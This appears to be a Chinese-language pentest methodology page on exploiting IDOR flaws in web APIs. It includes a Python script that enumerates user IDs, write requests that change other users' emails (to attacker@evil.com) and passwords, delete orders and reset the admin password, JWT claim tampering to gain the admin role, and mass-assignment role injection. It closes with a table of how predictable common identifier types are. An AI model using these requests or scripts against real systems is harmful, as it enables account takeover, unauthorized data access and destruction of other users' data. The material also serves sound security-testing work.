# IDOR 深度利用技术

## 批量检测脚本

如果 ID 是自增的，用脚本批量检测：
```python
import requests

for uid in range(1, 100):
    r = requests.get(f'http://target/api/users/{uid}/profile',
                     headers={'Authorization': 'Bearer YOUR_TOKEN'})
    if r.status_code == 200 and uid != 1001:  # 1001 是你自己
        print(f'IDOR: user {uid} accessible')
```

## 写操作越权测试

确认读越权后，测试更危险的写操作：
```
PUT /api/users/1002 {"email": "attacker@evil.com"}    → 修改他人邮箱
PATCH /api/users/1002 {"password": "hacked"}           → 修改他人密码
DELETE /api/orders/5003                                 → 删除他人订单
POST /api/users/1/reset-password                        → 重置管理员密码
```

写操作 IDOR 比读操作严重得多——能改密码就能接管账户。

## 垂直越权

### 访问管理端点
```
GET /api/admin/users          → 普通用户能访问管理接口？
GET /api/admin/dashboard      → 管理面板数据？
POST /api/admin/create-user   → 能创建新用户？
```

### JWT/Token Claims 篡改
```json
// 解码 JWT payload
{"user_id": 1001, "role": "user"}
// 篡改
{"user_id": 1, "role": "admin"}
```
如果 JWT 可以被篡改（`alg:none` 或弱密钥），这就是垂直越权。
详细 JWT 攻击参考 `jwt-attack-methodology`。

### 参数注入提权
注册/更新个人资料时注入权限字段：
```json
{"username": "test", "role": "admin"}
{"username": "test", "is_admin": true}
```
详细 Mass Assignment 参考 `privilege-escalation-web`。

## 标识符类型与可预测性

| 类型 | 示例 | 可预测性 |
|------|------|----------|
| 自增整数 | `1, 2, 3, 4...` | 极高——直接遍历 |
| 短序列号 | `ORD-001, ORD-002` | 高——有规律 |
| 时间戳 | `1679012345` | 中——可推算范围 |
| UUID v1 | `6ba7b810-9dad-...` | 中——v1 含时间戳，可推测 |
| UUID v4 | `f47ac10b-58cc-...` | 低——真随机 |
| 哈希值 | `a1b2c3d4e5f6...` | 低——需要其他泄露 |

UUID v4 通常安全但也要测试——有时 API 会在其他接口泄露 UUID。
